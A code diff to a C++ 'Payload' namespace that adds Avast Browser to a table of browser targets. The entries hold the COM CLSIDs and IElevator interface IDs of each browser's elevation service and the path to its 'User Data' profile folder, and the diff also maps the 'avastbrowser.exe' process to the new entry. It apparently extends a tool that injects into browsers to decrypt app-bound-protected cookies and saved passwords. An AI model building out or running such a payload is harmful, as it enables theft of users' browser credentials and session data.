@@ -53,7 +53,12 @@ namespace Payload {
                 {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},  // CLSID
                 {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},  // IElevatorEdge (v1)
                 IID{0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}},  // IElevator2Edge (v2, Edge 144+)
-                localApp / "Microsoft" / "Edge" / "User Data"}}
+                localApp / "Microsoft" / "Edge" / "User Data"}},
+            {"avast", {"Avast", L"AvastBrowser.exe",
+                {0xEAD34EE8, 0x8D08, 0x4CA1, {0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11}},  // CLSID
+                {0x7737BB9F, 0xBAC1, 0x4C71, {0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F}},  // IElevatorChrome IID (Avast uses this, not base IElevator)
+                std::nullopt,  // No IElevator2 for Avast
+                localApp / "AVAST Software" / "Browser" / "User Data"}}
         };
     }
 
@@ -66,6 +71,7 @@ namespace Payload {
         if (exe == "chrome.exe") return GetConfigs().at("chrome");
         if (exe == "brave.exe") return GetConfigs().at("brave");
         if (exe == "msedge.exe") return GetConfigs().at("edge");
+        if (exe == "avastbrowser.exe") return GetConfigs().at("avast");
         
         throw std::runtime_error("Unknown browser process");
     }
